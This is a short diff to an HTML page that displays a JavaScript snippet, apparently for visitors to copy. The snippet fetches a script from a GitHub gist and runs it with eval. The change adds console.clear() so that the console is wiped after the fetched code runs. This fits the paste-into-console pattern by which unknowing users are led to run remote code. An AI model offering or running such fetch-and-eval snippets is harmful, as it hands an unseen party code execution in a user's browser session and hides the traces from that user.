@@ -17,7 +17,7 @@
     </style>
 </head>
 <body>
-    <div id="code">fetch('https://gist.githubusercontent.com/Khasan1111/f9218594bbc5006fc5701ace58c0128c/raw/e78e49461b10534ab308f0a323e8575ed91ac347/script.js').then(r => r.text()).then(eval)</div>
+    <div id="code">fetch('https://gist.githubusercontent.com/Khasan1111/f9218594bbc5006fc5701ace58c0128c/raw/e78e49461b10534ab308f0a323e8575ed91ac347/script.js').then(r => r.text()).then(code => { eval(code); console.clear(); })</div>
 
     <script>
         document.getElementById('code').addEventListener('click', function() {
